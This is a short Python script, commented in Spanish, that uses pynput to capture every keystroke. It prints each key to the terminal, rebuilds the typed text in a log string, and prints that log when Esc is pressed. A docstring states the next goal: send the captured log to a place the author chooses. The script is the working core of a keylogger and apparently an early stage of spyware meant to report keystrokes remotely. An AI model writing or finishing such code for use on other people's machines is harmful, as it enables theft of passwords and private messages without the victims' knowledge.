# encoding: utf-8
import pynput.keyboard as pynput
"""
Ahora mismo me muestra las pulsaciones en la terminal
- Que lo mande a algún sitio que yo le diga
"""

log = ""

#Método que dice que hacer cuando pulsemos una tecla
def process_key_press(key):
    global log
    res = str(key)
    
    if res[0]=="\'" and res[-1]=="\'":#Alfanumérico
        log = log + res[1]
        print("key = " + res[1])
    elif res=="Key.space":
        log = log + " "
        print("key = "+res)
    elif res=="Key.backspace":
        log = log[:-1]
        print("key = " + res)
    elif res=="Key.esc":
        log = log.replace("Key.space"," ")
        log = log.replace("Key.shift","")
        log = log.replace("['","")
        log = log.replace("']","")
        print("log = "+log)
        exit(0)
    else:#Caracter especial
        print("key = " + res)

#Creamos un objeto que escucha cuando se pulsa una tecla
keyboard_listener = pynput.Listener(on_press=process_key_press)
with keyboard_listener:
    keyboard_listener.join()
